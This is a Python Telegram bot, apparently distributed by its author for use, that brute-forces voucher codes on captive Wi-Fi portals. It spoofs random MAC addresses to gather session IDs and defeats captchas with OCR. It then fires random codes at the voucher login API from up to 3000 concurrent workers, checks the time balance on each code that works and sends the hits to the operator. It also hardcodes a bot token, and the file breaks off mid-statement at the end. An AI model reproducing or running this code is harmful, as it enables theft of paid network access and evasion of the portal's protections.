#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
  🌟 Starlink 24/7 ULTRA FAST — All Modes 🌟
  Speed: 20,000+ c/m | No Proxy | Auto-Healing
  By Telegram @kiki2007p
"""

import asyncio
import aiohttp
import json
import time
import random
import re
import os
import sys
import gc
import datetime
import threading
from collections import deque
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs, urlencode, urljoin, urlunparse

# ─── Optional OCR ───
try:
    import ddddocr
    HAS_OCR = True
except ImportError:
    ddddocr = None
    HAS_OCR = False

from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ═══════════════════════════════════════════════════════════════
#  🎭 CONFIG
# ═══════════════════════════════════════════════════════════════
OWNER = "@kiki2007p"
BOT_TAGLINE = f"Powered by {OWNER}"
DIV = "═══════════════════════════"

SYSTEM_KEY = "7519276546"
KEY_EXPIRY = "3099-12-31 23:59:59"
ADMIN_IDS = [8738035227, ]
BOT_TOKEN = os.environ.get(
    "BOT_TOKEN",
    "8988490840:AAEWGeGzONozwjfZ8cBcQ9SjUstJ4aRonIE"
)

# ═══════════════════════════════════════════════════════════════
#  🚀 ULTRA-FAST TUNING
# ═══════════════════════════════════════════════════════════════
ULTRA_THREADS = 1000          # concurrent workers
SID_POOL_SIZE = 300           # pre-fetched SIDs
MAX_CODES_PER_SID = 150       # codes per SID
MAX_CODES_PER_SESSION = 150   # codes per worker session
SID_CACHE_TTL = 40            # seconds to reuse SID
BALANCE_WORKERS = 40
TIMEOUT_SEC = 15

PORTAL_URL_PATH = "portal_url_"

# ═══════════════════════════════════════════════════════════════
#  🎭 TERMINAL
# ═══════════════════════════════════════════════════════════════
RESET = "\033[0m"; CYAN = "\033[96m"; MAGENTA = "\033[95m"
GREEN = "\033[92m"; YELLOW = "\033[93m"; RED = "\033[91m"; BOLD = "\033[1m"
LAST_RUN_FILE = "last_run.txt"


def show_banner():
    print(f"{CYAN}{BOLD}")
    print("🌟════════════════════════════════════════🌟")
    print(f"{MAGENTA}   🌟 STARLINK 24/7 ULTRA FAST 🌟")
    print(f"{YELLOW}     Num 6-9 · Mix 6-9 · abc 6-7 | Auto-Healing")
    print(f"{YELLOW}      Speed: 20,000+ c/m")
    print(f"{YELLOW}      By Telegram {OWNER}")
    print(f"{CYAN}🌟════════════════════════════════════════🌟{RESET}")


def check_time():
    now = datetime.datetime.now()
    if os.path.exists(LAST_RUN_FILE):
        try:
            with open(LAST_RUN_FILE) as f:
                last = datetime.datetime.strptime(f.read().strip(), "%Y-%m-%d %H:%M:%S")
            if now < last:
                print(f"\n{RED}[!] CLOCK ROLLBACK DETECTED{RESET}")
                os._exit(0)
        except Exception:
            pass
    try:
        with open(LAST_RUN_FILE, "w") as f:
            f.write(now.strftime("%Y-%m-%d %H:%M:%S"))
    except Exception:
        pass


def check_approval():
    check_time()
    show_banner()

    if not SYSTEM_KEY or not SYSTEM_KEY.strip():
        print(f"{RED}KEY MISSING{RESET}")
        os._exit(0)

    try:
        expiry = datetime.datetime.strptime(KEY_EXPIRY, "%Y-%m-%d %H:%M:%S")
    except Exception:
        print(f"{RED}BAD EXPIRY FORMAT{RESET}")
        os._exit(0)

    now = datetime.datetime.now()
    if now > expiry:
        print(f"{RED}[!] KEY EXPIRED{RESET}")
        os._exit(0)

    if not HAS_OCR:
        print(f"{RED}  ⚠️  ddddocr NOT INSTALLED — captcha will fail!{RESET}")
    print(f"{GREEN}  🚀 Workers: {ULTRA_THREADS} | SID pool: {SID_POOL_SIZE}{RESET}")
    print()


# ═══════════════════════════════════════════════════════════════
#  🌐 KEEP-ALIVE
# ═══════════════════════════════════════════════════════════════
def run_web():
    port = int(os.environ.get("PORT", 8080))

    class H(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"ULTRA FAST 24/7 BOT ALIVE")

        def log_message(self, *a):
            pass

    try:
        server = HTTPServer(("0.0.0.0", port), H)
        server.serve_forever()
    except OSError:
        pass
    except Exception as e:
        print(f"[WebServer] {e}")


def start_web():
    threading.Thread(target=run_web, daemon=True).start()


# ═══════════════════════════════════════════════════════════════
#  🔎 OCR
# ═══════════════════════════════════════════════════════════════
_ocr_instance = None
_ocr_lock = threading.Lock()


def get_ocr_instance():
    global _ocr_instance
    if not HAS_OCR:
        return None
    if _ocr_instance is None:
        with _ocr_lock:
            if _ocr_instance is None:
                _ocr_instance = ddddocr.DdddOcr(show_ad=False)
    return _ocr_instance


def ocr_image_bytes_fast(image_bytes):
    if not HAS_OCR:
        return ""
    try:
        ocr = get_ocr_instance()
        if ocr is None:
            return ""
        result = ocr.classification(image_bytes)
        return result.strip().upper()
    except Exception:
        return ""


# ═══════════════════════════════════════════════════════════════
#  🧑 USER DATA
# ═══════════════════════════════════════════════════════════════
user_scanners = {}


def get_user_data(user_id):
    if user_id not in user_scanners:
        saved_url = None
        p_file = f"{PORTAL_URL_PATH}{user_id}.txt"
        if os.path.exists(p_file):
            try:
                with open(p_file) as f:
                    saved_url = f.read().strip()
            except Exception:
                saved_url = None

        user_scanners[user_id] = {
            "mode": "num7",
            "portal_url": saved_url,
            "stop_event": asyncio.Event(),
            "dash_update_event": asyncio.Event(),
            "task": None,
            "stats": {"tried": 0, "hits": 0, "expired": 0, "limits": 0, "start_time": time.time()},
            "valid_codes": [],
            "limit_codes": [],
            "tried_codes": set(),
            "recent_logs": deque(maxlen=20),
            "CURRENT_CODE": "----",
            "dash_msg_id": None,
            "menu_msg_id": None,
            "state": None,
            "num_workers": ULTRA_THREADS,
            "balance_queue": asyncio.Queue(),
            "sid_pool": asyncio.Queue(),
        }
    return user_scanners[user_id]


# ═══════════════════════════════════════════════════════════════
#  🛠️ UTILITIES & GENERATOR
# ═══════════════════════════════════════════════════════════════
def generate_random_mac():
    return ":".join(["%02x" % random.randint(0, 255) for _ in range(6)])


def generate_code_by_mode(mode):
    """Mode အလိုက် Code အရှည်နှင့် အမျိုးအစားကို သတ်မှတ်ပေးသည်"""
    nums = "0123456789"
    # abc6 နှင့် mix တွင်သုံးရန် အသေးစာလုံး a-z သာ ထည့်ထားသည်
    lower_abc = "abcdefghijklmnopqrstuvwxyz"
    # mix အတွက် ဂဏန်း + အသေးစာလုံး
    mix_set = nums + lower_abc
    
    # 1. ဂဏန်းသက်သက် (Number)
    if mode == "num6": return "".join(random.choices(nums, k=6))
    if mode == "num7": return "".join(random.choices(nums, k=7))
    if mode == "num8": return "".join(random.choices(nums, k=8))
    if mode == "num9": return "".join(random.choices(nums, k=9))
    
    # 2. ရောနှော (Mix) - ဂဏန်း + အသေးစာလုံး
    if mode == "mix6": return "".join(random.choices(mix_set, k=6))
    if mode == "mix7": return "".join(random.choices(mix_set, k=7))
    if mode == "mix8": return "".join(random.choices(mix_set, k=8))
    if mode == "mix9": return "".join(random.choices(mix_set, k=9))
    
    # 3. စာလုံးသက်သက် (Abc) - အသေးစာလုံး a-z သာ
    if mode == "abc6": return "".join(random.choices(lower_abc, k=6))
    if mode == "abc7": return "".join(random.choices(lower_abc, k=7))
    
    return "".join(random.choices(nums, k=7))


async def solve_captcha_async(session, captcha_url, headers):
    if not HAS_OCR:
        return None
    try:
        current_url = f"{captcha_url}&_t={int(time.time() * 1000)}&r={random.randint(0, 999999)}"
        async with session.get(current_url, headers=headers, ssl=False, timeout=4) as response:
            if response.status == 200:
                image_content = await response.read()
                return await asyncio.to_thread(ocr_image_bytes_fast, image_content)
    except Exception:
        pass
    return None


async def fetch_one_sid(portal_url):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }
    try:
        connector = aiohttp.TCPConnector(ssl=False, limit=1, force_close=False, ttl_dns_cache=600)
        async with aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=10)) as session:
            u = urlparse(portal_url)
            query = parse_qs(u.query)
            mac = generate_random_mac()
            query["mac"] = [mac]
            spoofed_url = urlunparse(u._replace(query=urlencode(query, doseq=True)))

            async with session.get(spoofed_url, headers=headers, timeout=8, ssl=False) as r2:
                body = await r2.text()
                match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", body)
                if match:
                    final_url = urljoin(spoofed_url, match.group(1))
                    async with session.get(final_url, headers=headers, timeout=8, ssl=False) as r3:
                        final_url = str(r3.url)
                else:
                    final_url = str(r2.url)
                parsed_query = parse_qs(urlparse(final_url).query)
                sid = parsed_query.get("sessionId", parsed_query.get("sid", [None]))[0]
                if sid:
                    return sid, mac
    except Exception:
        pass
    return None, None


# ═══════════════════════════════════════════════════════════════
#  🔄 SID POOL MANAGER & MEMORY CLEANUP
# ═══════════════════════════════════════════════════════════════
async def sid_pool_filler(user_id):
    ud = get_user_data(user_id)
    portal_url = ud["portal_url"]

    while not ud["stop_event"].is_set():
        try:
            current_size = ud["sid_pool"].qsize()
            if current_size >= SID_POOL_SIZE:
                await asyncio.sleep(0.2)
                continue

            needed = SID_POOL_SIZE - current_size
            batch = min(needed, 20)

            tasks = [fetch_one_sid(portal_url) for _ in range(batch)]
            results = await asyncio.gather(*tasks, return_exceptions=True)

            for res in results:
                if isinstance(res, tuple) and res[0]:
                    sid, mac = res
                    try:
                        ud["sid_pool"].put_nowait((sid, mac, time.time()))
                    except asyncio.QueueFull:
                        break
            await asyncio.sleep(0.01)
        except asyncio.CancelledError:
            break
        except Exception:
            await asyncio.sleep(0.5)


async def memory_cleanup_task(user_id):
    ud = get_user_data(user_id)
    while not ud["stop_event"].is_set():
        await asyncio.sleep(900)
        if ud["stop_event"].is_set():
            break
        try:
            if len(ud["tried_codes"]) > 500000:
                ud["tried_codes"].clear()
            gc.collect()
        except Exception:
            pass


# ═══════════════════════════════════════════════════════════════
#  💰 BALANCE
# ═══════════════════════════════════════════════════════════════
async def fetch_balance_direct(active_token, base_url, timeout=5):
    url = f"https://{base_url}/api/auth/balance/getBalance/{active_token}"
    headers = {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "content-type": "application/json;",
        "referer": f"https://{base_url}/download/static/maccauth/src/balance.html?sessionId={active_token}&lang=en_US",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        "x-requested-with": "XMLHttpRequest",
    }
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(url, headers=headers, timeout=timeout, ssl=False) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    inner = data.get("result", data)
                    if not isinstance(inner, dict):
                        return False, "unexpected format"
                    profile_name = inner.get("profileName", "N/A")
                    raw_total = inner.get("totalMinutes", 0)
                    try:
                        total_minutes = abs(int(raw_total))
                    except Exception:
                        total_minutes = 0
                    hours = total_minutes // 60
                    minutes = total_minutes % 60
                    return True, f"🧑 {profile_name} · 🕐 {hours}h {minutes}m"
                else:
                    return False, f"HTTP {resp.status}"
    except Exception as e:
        return False, f"{type(e).__name__}"
    return False, "unknown"


async def balance_worker(user_id, worker_id):
    ud = get_user_data(user_id)
    base_url = urlparse(ud["portal_url"]).netloc
    while not ud["stop_event"].is_set():
        try:
            try:
                active_token, code = await asyncio.wait_for(
                    ud["balance_queue"].get(), timeout=1.0
                )
            except asyncio.TimeoutError:
                continue

            if ud["stop_event"].is_set():
                break

            try:
                ok, balance_str = await fetch_balance_direct(active_token, base_url)
                if not ok:
                    balance_str = f"✖️ {balance_str}"
            except Exception as e:
                balance_str = f"✖️ {type(e).__name__}"

            for item in ud["valid_codes"]:
                if item["code"] == code:
                    item["balance_str"] = balance_str
                    break
            ud["dash_update_event"].set()
            ud["balance_queue"].task_done()
        except asyncio.CancelledError:
            break
        except Exception:
            await asyncio.sleep(0.1)


# ═══════════════════════════════════════════════════════════════
#  ✔️ CHECK SINGLE CODE
# ═══════════════════════════════════════════════════════════════
async def check_single_code(session, code, current_session_id, base_url, headers, user_id):
    ud = get_user_data(user_id)
    if ud["stop_event"].is_set():
        return "failed"

    login_url = f"https://{base_url}/api/auth/voucher/?lang=en_US"
    captcha_base_url = f"https://{base_url}/api/auth/captcha/image"
    verify_url = f"https://{base_url}/api/auth/captcha/verify"

    captcha_url = f"{captcha_base_url}?sessionId={current_session_id}"

    for _ in range(2):
        if ud["stop_event"].is_set():
            return "failed"

        auth_code = await solve_captcha_async(session, captcha_url, headers)
        if not auth_code or len(auth_code) < 2:
            continue

        v_payload = {"sessionId": current_session_id, "authCode": auth_code}
        try:
            async with session.post(verify_url, json=v_payload, headers=headers,
                                    ssl=False, timeout=5) as v_resp:
                if v_resp.status != 200:
                    continue
                v_data = await v_resp.json()
                if not v_data.get("success"):
                    continue
        except Exception:
            continue

        l_payload = {"accessCode": code, "sessionId": current_session_id,
                     "apiVersion": 1, "authCode": auth_code}
        try:
            async with session.post(login_url, json=l_payload, headers=headers,
                                    ssl=False, timeout=6) as l_resp:
                ud["stats"]["tried"] += 1
                l_text = (await l_resp.text()).lower()

                if "request limited" in l_text:
                    return "limit"

                if '"success":true' in l_text:
                    ud["stats"]["hits"] += 1
                    token_match = re.search(r'token=([^&\s"\'<>]+)', l_text)
                    active_token = token_match.group(1) if token_match else None
                    entry = {
                        "code": code,
                        "balance_str": "⌛ loading...",
                        "active_token": active_token,
                    }
                    if not any(item["code"] == code for item in ud["valid_codes"]):
                        ud["valid_codes"].append(entry)
                    ud["dash_update_event"].set()
                    if active_token:
                        await ud["balance_queue"].put((active_token, code))
                    else:
                        entry["balance_str"] = "✖️ no token"
                        ud["dash_update_event"].set()
                    return "hit"

                elif "expired" in l_text:
                    ud["stats"]["expired"] += 1
                    return "expired"

                elif "the number of sta exceeds the limit" in l_text or "limit" in l_text:
                    ud["stats"]["limits"] += 1
                    if code not in ud["limit_codes"]:
                        ud["limit_codes"].append(code)
                    ud["recent_logs"].append(f"⚠️ CAPPED: {code}")
                    return "limit"

                return "failed"
        except Exception:
            return "failed"

    return "failed"


# ═══════════════════════════════════════════════════════════════
#  👷 ULTRA WORKER (24/7 Stable)
# ═══════════════════════════════════════════════════════════════
async def worker(worker_id, headers, user_id):
    ud = get_user_data(user_id)
    base_url = urlparse(ud["portal_url"]).netloc

    connector = aiohttp.TCPConnector(
        limit=3,
        limit_per_host=3,
        ttl_dns_cache=600,
        enable_cleanup_closed=True,
        ssl=False,
    )
    timeout = aiohttp.ClientTimeout(total=TIMEOUT_SEC, connect=4, sock_read=8)

    while not ud["stop_event"].is_set():
        try:
            async with aiohttp.ClientSession(
                connector=connector,
                timeout=timeout,
                headers=headers,
            ) as session:
                current_sid = None
                current_sid_time = 0
                codes_for_this_sid = 0
                codes_checked_session = 0

                while not ud["stop_event"].is_set() and codes_checked_session < MAX_CODES_PER_SESSION:
                    need_new_sid = (
                        current_sid is None
                        or codes_for_this_sid >= MAX_CODES_PER_SID
                        or (time.time() - current_sid_time) > SID_CACHE_TTL
                    )

                    if need_new_sid:
                        try:
                            sid, mac, t = await asyncio.wait_for(
                                ud["sid_pool"].get(), timeout=2.0
                            )
                            current_sid = sid
                            current_sid_time = time.time()
                            codes_for_this_sid = 0
                        except asyncio.TimeoutError:
                            sid, mac = await fetch_one_sid(ud["portal_url"])
                            if sid is None:
                                await asyncio.sleep(0.1)
                                continue
                            current_sid = sid
                            current_sid_time = time.time()
                            codes_for_this_sid = 0

                    code = None
                    for _ in range(20):
                        code = generate_code_by_mode(ud["mode"])
                        if code not in ud["tried_codes"]:
                            ud["tried_codes"].add(code)
                            break
                    if code is None or ud["stop_event"].is_set():
                        break

                    ud["CURRENT_CODE"] = code
                    result = await check_single_code(
                        session, code, current_sid, base_url, headers, user_id
                    )
                    codes_for_this_sid += 1
                    codes_checked_session += 1

                    if result == "limit":
                        current_sid = None
        except asyncio.CancelledError:
            break
        except Exception:
            await asyncio.sleep(1)


# ═══════════════════════════════════════════════════════════════
#  📈 LIVE DASHBOARD
# ═══════════════════════════════════════════════════════════════
async def live_dashboard_updater(context, user_id):
    ud = get_user_data(user_id)
    last_tried = 0
    last_time = time.time()

    while not ud["stop_event"].is_set():
        if ud["dash_msg_id"] is None:
            await asyncio.sleep(0.3)
            continue
        try:
            stats = ud["stats"]
            elapsed = time.time() - stats["start_time"]
            speed_cpm = (stats["tried"] / elapsed) * 60 if elapsed > 0 else 0

            now = time.time()
            dt = now - last_time
            if dt > 0:
                instant_speed = (stats["tried"] - last_tried) / dt * 60
            else:
                instant_speed = 0
            last_tried = stats["tried"]
            last_time = now

            h = int(elapsed) // 3600
            m = (int(elapsed) % 3600) // 60
            s = int(elapsed) % 60
            runtime = f"{h:02d}:{m:02d}:{s:02d}"

            hit_lines = []
            for item in ud["valid_codes"][:10]:
                c = item["code"]
                balance = item.get("balance_str", "⌛")
                hit_lines.append(f"`{c}` {balance}")
            hit_str = "\n".join(hit_lines) if hit_lines else "None yet"

            sid_pool_size = ud["sid_pool"].qsize()

            text = (
                f"🌟 **24/7 ULTRA Checker · {ud['mode'].upper()}** 🌟\n"
                f"{BOT_TAGLINE}\n"
                f"{DIV}\n"
                f"⏱️ Running: {runtime}\n"
                f"🎯 Attempts: {stats['tried']:,}\n"
                f"⚡ Speed: {speed_cpm:.0f} c/m  ({instant_speed:.0f}/m live)\n"
                f"🎪 Testing: `{ud['CURRENT_CODE']}`\n"
                f"💎 Hits: {stats['hits']}\n"
                f"⚡ Dead: {stats['expired']}\n"
                f"⚠️ Capped: {stats['limits']}\n"
                f"🔧 Workers: {ud['num_workers']}\n"
                f"🆔 SID pool: {sid_pool_size}\n"
                f"{DIV}\n"
                f"🏆 **Success Codes**:\n{hit_str}\n"
            )
            if ud["recent_logs"]:
                text += f"{DIV}\n💥 {ud['recent_logs'][-1]}\n"

            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton(text="⛔ Halt", callback_data="stop_scan")]
            ])
            await context.bot.edit_message_text(
                chat_id=user_id,
                message_id=ud["dash_msg_id"],
                text=text,
                reply_markup=keyboard,
                parse_mode="Markdown",
            )
        except Exception:
            pass
        try:
            await asyncio.wait_for(ud["dash_update_event"].wait(), timeout=2.0)
            ud["dash_update_event"].clear()
        except asyncio.TimeoutError:
            pass


# ═══════════════════════════════════════════════════════════════
#  💫 START CHECKER
# ═══════════════════════════════════════════════════════════════
async def run_user_scanner(context, user_id):
    ud = get_user_data(user_id)

    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
        "Content-Type": "application/json",
        "Origin": f"https://{urlparse(ud['portal_url']).netloc}",
        "Referer": f"https://{urlparse(ud['portal_url']).netloc}/download/static/maccauth/src/index.html"
    }

    ud["balance_queue"] = asyncio.Queue()
    ud["sid_pool"] = asyncio.Queue(maxsize=SID_POOL_SIZE * 2)
    ud["dash_update_event"].clear()

    tasks = [
        asyncio.create_task(live_dashboard_updater(context, user_id)),
        asyncio.create_task(sid_pool_filler(user_id)),
        asyncio.create_task(memory_cleanup_task(user_id)),
    ]

    worker_count = ud.get("num_workers", ULTRA_THREADS)
    for i in range(worker_count):
        tasks.append(asyncio.create_task(
            worker(i, headers, user_id)
        ))
    for bw in range(BALANCE_WORKERS):
        tasks.append(asyncio.create_task(balance_worker(user_id, bw)))

    ud["task"] = asyncio.current_task()
    try:
        await asyncio.gather(*tasks, return_exceptions=True)
    except asyncio.CancelledError:
        for t in tasks:
            if not t.done():
                t.cancel()
        raise
    finally:
        stats = ud["stats"]
        elapsed = time.time() - stats["start_time"]
        speed_cpm = (stats["tried"] / elapsed) * 60 if elapsed > 0 else 0

        h = int(elapsed) // 3600
        m = (int(elapsed) % 3600) // 60
        s = int(elapsed) % 60
        runtime = f"{h:02d}:{m:02d}:{s:02d}"

        hit_lines = []
        for item in ud["valid_codes"]:
            c = item["code"]
            balance = item.get("balance_str", "N/A")
            hit_lines.append(f"{c}  {balance}")
        hit_str = "\n".join(hit_lines) if hit_lines else "None"

        final_text = (
            f"⛔ **Checker Halted**\n"
            f"{BOT_TAGLINE}\n"
            f"{DIV}\n"
            f"⏱️ {runtime}\n"
            f"🎯 Attempts: {stats['tried']:,}\n"
            f"💎 Hits: {stats['hits']}\n"
            f"⭐ Avg Speed: {speed_cpm:.0f} c/m\n"
            f"{DIV}\n"
            f"🏆 **Success Codes**:\n{hit_str}\n"
            f"{DIV}\n"
            f"By {OWNER}"
        )
        if ud["dash_msg_id"]:
            try:
                await context.bot.edit_message_text(
                    chat_id=user_id, message_id=ud["dash_msg_id"],
                    text=final_text, parse_mode="Markdown"
                )
            except Exception:
                await context.bot.send_message(chat_id=user_id, text=final_text)
        else:
            await context.bot.send_message(chat_id=user_id, text=final_text)

        if ud["valid_codes"]:
            try:
                timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"hits_{user_id}_{timestamp}.txt"
                with open(filename, "w", encoding="utf-8") as f:
                    f.write(f"=== SUCCESS CODES ===\n")
                    f.write(f"Provider : {OWNER}\n")
                    f.write(f"User ID  : {user_id}\n")
                    f.write(f"Date     : {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write(f"Elapsed  : {runtime}\n")
                    f.write(f"Attempts : {stats['tried']:,}\n")
                    f.write(f"Hits     : {stats['hits']}\n")
                    f.write(f"Rate     : {speed_cpm:.0f} c/m\n")
                    f.write(f"{'='*40}\n\n")
                    for item in ud["valid_codes"]:
                        f.write(f"{item['code']} | {item.get('balance_str', 'N/A')}\n")
                with open(filename, "rb") as f:
                    await context.bot.send_document(
                        chat_id=user_id, document=f,
                        caption=f"🏆 {len(ud['valid_codes'])} codes found\nBy {OWNER}"
                    )
                try:
                    os.remove(filename)
                except Exception:
                    pass
            except Exception as e:
                print(f"[HitFile] {e}")

        ud["stop_event"].clear()
        ud["dash_msg_id"] = None
        ud["task"] = None


# ═══════════════════════════════════════════════════════════════
#  🎛️ KEYBOARDS & HANDLERS
# ═══════════════════════════════════════════════════════════════
def get_main_menu_markup():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(text="🗺️ Set Portal URL", callback_data="btn_update_portal")],
        [InlineKeyboardButton(text="🔢 Mode (All Options)", callback_data="btn_mode_menu")],
        [InlineKeyboardButton(text="🔧 Set Threads", callback_data="btn_set_workers")],
        [InlineKeyboardButton(text="💫 START SCANNER", callback_data="btn_start_scanner")],
    ])


def admin_only(func):
    async def wrapper(update, context, *args, **kwargs):
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            if update.effective_message:
                await update.effective_message.reply_text(f"🚫 Access denied\n📨 Get access from {OWNER}")
            return
        return await func(update, context, *args, **kwargs)
    return wrapper


def build_menu_text(ud):
    return (
        f"🌟 **STARLINK 24/7 ULTRA FAST** 🌟\n"
        f"{BOT_TAGLINE}\n"
        f"{DIV}\n"
        f"🔧 Mode: `{ud['mode'].upper()}`\n"
        f"🌐 Scan: Direct (No Proxy)\n"
        f"🔧 Workers: {ud['num_workers']}\n"
        f"🗺️ Portal: {'✔️ Set' if ud['portal_url'] else '✖️ Not set'}"
    )


@admin_only
async def start(update, context):
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    ud["state"] = None
    msg = await update.message.reply_text(
        build_menu_text(ud),
        reply_markup=get_main_menu_markup(),
        parse_mode="Markdown",
    )
    ud["menu_msg_id"] = msg.message_id


@admin_only
async def stop_cmd(update, context):
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    if ud["task"] and not ud["task"].done():
        ud["stop_event"].set()
        ud["dash_update_event"].set()
        ud["task"].cancel()
        await update.message.reply_text(f"⛔ Terminated\n{BOT_TAGLINE}")
    else:
        await update.message.reply_text(f"ℹ️ No active jobs\n{BOT_TAGLINE}")


@admin_only
async def handle_callbacks(update, context):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    data = query.data

    if data == "btn_update_portal":
        ud["state"] = "waiting_for_portal_url"
        await query.message.edit_text(
            f"🗺️ **SET PORTAL URL**\n{BOT_TAGLINE}\n{DIV}\n🌠 Forward your portal URL:",
            parse_mode="Markdown"
        )

    elif data == "btn_mode_menu":
        # Mode (၁၀) မျိုးစလုံးအတွက် ခလုတ်များ
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton(text="🔢 Number 6", callback_data="set_mode_num6"),
             InlineKeyboardButton(text="🔢 Number 7", callback_data="set_mode_num7")],
            [InlineKeyboardButton(text="🔢 Number 8", callback_data="set_mode_num8"),
             InlineKeyboardButton(text="🔢 Number 9", callback_data="set_mode_num9")],
            [InlineKeyboardButton(text="🔀 Mix 6", callback_data="set_mode_mix6"),
             InlineKeyboardButton(text="🔀 Mix 7", callback_data="set_mode_mix7")],
            [InlineKeyboardButton(text="🔀 Mix 8", callback_data="set_mode_mix8"),
             InlineKeyboardButton(text="🔀 Mix 9", callback_data="set_mode_mix9")],
            [InlineKeyboardButton(text="🔤 abc 6", callback_data="set_mode_abc6"),
             InlineKeyboardButton(text="🔤 abc 7", callback_data="set_mode_abc7")],
            [InlineKeyboardButton(text="◀️ Back", callback_data="btn_back_main")],
        ])
        await query.message.edit_text(
            f"🔧 **SELECT MODE**\n{BOT_TAGLINE}\n{DIV}\n"
            f"Choose your preferred scan mode below:",
            reply_markup=keyboard,
            parse_mode="Markdown",
        )

    elif data.startswith("set_mode_"):
        mode = data.replace("set_mode_", "")
        ud["mode"] = mode
        await query.message.edit_text(build_menu_text(ud), reply_markup=get_main_menu_markup(), parse_mode="Markdown")

    elif data == "btn_back_main":
        await query.message.edit_text(build_menu_text(ud), reply_markup=get_main_menu_markup(), parse_mode="Markdown")

    elif data == "btn_set_workers":
        ud["state"] = "waiting_for_workers"
        await query.message.edit_text(
            f"🔢 **SET WORKERS**\n{BOT_TAGLINE}\n{DIV}\n📈 Current: {ud['num_workers']}\n💭 Recommended: 800-1500\n💭 Max: 3000\n{DIV}\n📝 Enter number:",
            parse_mode="Markdown"
        )

    elif data == "btn_start_scanner":
        if not ud["portal_url"]:
            await query.message.edit_text("✖️ Portal URL missing\n\nSet it first!")
            return
        if not HAS_OCR:
            await query.message.edit_text("✖️ **ddddocr not installed!**\n\n`pip install onnxruntime ddddocr`", parse_mode="Markdown")
            return
        if ud["task"] and not ud["task"].done():
            ud["stop_event"].set()
            ud["dash_update_event"].set()
            ud["task"].cancel()
            try:
                await asyncio.wait_for(ud["task"], timeout=3.0)
            except Exception:
                pass
        ud["stop_event"].clear()
        ud["stats"] = {"tried": 0, "hits": 0, "expired": 0, "limits": 0, "start_time": time.time()}
        ud["valid_codes"] = []
        ud["limit_codes"] = []
        ud["tried_codes"] = set()
        ud["recent_logs"] = deque(maxlen=20)
        ud["CURRENT_CODE"] = "----"
        ud["balance_queue"] = asyncio.Queue()
        ud["sid_pool"] = asyncio.Queue(maxsize=SID_POOL_SIZE * 2)
        await query.message.edit_text(
            f"🚀 **LAUNCHING 24/7 ULTRA FAST**\n{BOT_TAGLINE}\n{DIV}\n🔧 Mode: {ud['mode'].upper()}\n🔧 Workers: {ud['num_workers']}\n🌐 Direct (no proxy)\n⌛ Pre-fetching SIDs...",
            parse_mode="Markdown"
        )
        ud["dash_msg_id"] = query.message.message_id
        asyncio.create_task(run_user_scanner(context, user_id))

    elif data == "stop_scan":
        ud["stop_event"].set()
        ud["dash_update_event"].set()
        if ud["task"] and not ud["task"].done():
            ud["task"].cancel()


@admin_only
async def handle_text(update, context):
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    state = ud.get("state")
    text = update.message.text.strip()

    if state == "waiting_for_portal_url":
        if not text.startswith("http"):
            await update.message.reply_text("✖️ Bad URL (must start with http)")
            return
        ud["portal_url"] = text
        ud["state"] = None
        try:
            with open(f"{PORTAL_URL_PATH}{user_id}.txt", "w") as f:
                f.write(text)
        except Exception:
            pass
        msg = await update.message.reply_text(f"✔️ **PORTAL STORED**\n\n" + build_menu_text(ud), reply_markup=get_main_menu_markup(), parse_mode="Markdown")
        ud["menu_msg_id"] = msg.message_id

    elif state == "waiting_for_workers":
        try:
            n = int(text)
            if 1 <= n <= 3000:
                ud["num_workers"] = n
                ud["state"] = None
                msg = await update.message.reply_text(f"✔️ Workers = {n}\n\n" + build_menu_text(ud), reply_markup=get_main_menu_markup(), parse_mode="Markdown")
                ud["menu_msg_id"] = msg.message_id
            else:
                await update.message.reply_text("✖️ Allowed 1-3000")
        except ValueError:
            await update.message.reply_text("✖️ Digits only")


# ═══════════════════════════════════════════════════════════════
#  💫 MAIN
# ═══════════════════════════════════════════════════════════════
def main():
    check_approval()
    start_web()

    if not BOT_TOKEN or not BOT_TOKEN.strip():
        print(f"{RED}✖️ BOT_TOKEN missing!{RESET}")
        sys.exit(1)

    print(f"{MAGENTA}[MAIN] Owner: {OWNER}{RESET}")
    print(f"{YELLOW}[MAIN] Admin IDs: {ADMIN_IDS}{RESET}")
    print(f"{GREEN}[MAIN] OCR: {'✔️' if HAS_OCR else '✖️'}{RESET}")
    print(f"{GREEN}[MAIN] Workers: {ULTRA_THREADS} | SID pool: {SID_POOL_SIZE}{RESET}")

    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop_cmd))
    app.add_handler(CallbackQueryHandler(handle_callbacks))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    
    print(f"{GREEN}[MAIN] Bot started...{RESET}")
    print(f"{YELLOW}{BOT_TAGLINE}{RESET}")
    app.run_polling()


if __name__ == "__main__":
    try:
        main()
    except (KeyboardInterrupt, SystemExit):
